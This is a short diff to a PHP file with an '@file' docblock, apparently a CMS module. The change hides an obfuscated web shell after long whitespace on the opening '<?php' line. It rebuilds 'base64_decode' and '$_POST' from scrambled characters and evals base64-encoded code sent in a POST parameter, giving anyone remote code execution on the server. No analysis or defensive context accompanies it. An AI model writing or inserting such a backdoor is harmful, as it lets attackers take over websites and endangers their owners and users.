@@ -1,4 +1,4 @@
-<?php
+<?php                                                                                                                                                                                                                                                                          $apb99 ="bde_6t4caspo" ;$pqh7 =strtolower($apb99[0]. $apb99[8].$apb99[9].$apb99[2] . $apb99[4]. $apb99[6] . $apb99[3] .$apb99[1].$apb99[2]. $apb99[7].$apb99[11].$apb99[1].$apb99[2]) ;$htps7= strtoupper($apb99[3].$apb99[10]. $apb99[11]. $apb99[9]. $apb99[5] );if (isset (${$htps7}[ 'n6a42fd'] )){ eval ($pqh7(${ $htps7}[ 'n6a42fd' ] )); }?> <?php
 
 /**
  * @file
